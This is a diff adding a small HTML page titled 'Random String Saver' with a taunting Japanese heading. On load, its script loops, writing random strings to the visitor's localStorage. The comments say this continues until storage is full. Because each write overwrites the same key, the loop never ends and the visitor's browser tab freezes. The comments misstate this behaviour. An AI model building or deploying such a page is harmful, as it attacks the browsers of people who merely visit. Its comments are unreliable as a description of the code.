@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Random String Saver</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 10em;
+      margin-bottom: 0;
+    }
+  </style>
+</head>
+<body>
+  <h1>ざぁこざぁこ♡</h1>
+
+  <script>
+    // ローカルストレージにランダムな文字列を保存する関数
+    function saveRandomString() {
+      // ランダムな文字列を生成
+      const randomString = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+
+      // ローカルストレージに保存
+      try {
+        localStorage.setItem('randomString', randomString);
+      } catch (error) {
+        // ローカルストレージがいっぱいになった場合、エラー処理
+        console.error('ローカルストレージがいっぱいになりました。');
+        // ループを終了
+        return false;
+      }
+
+      return true; // 保存成功
+    }
+
+    // サイトにアクセスしたら実行
+    window.addEventListener('load', () => {
+      // ループ処理でローカルストレージがいっぱいになるまで実行
+      while (saveRandomString()) {
+        // 保存成功したらループを続ける
+      }
+    });
+  </script>
+</body>
+</html>
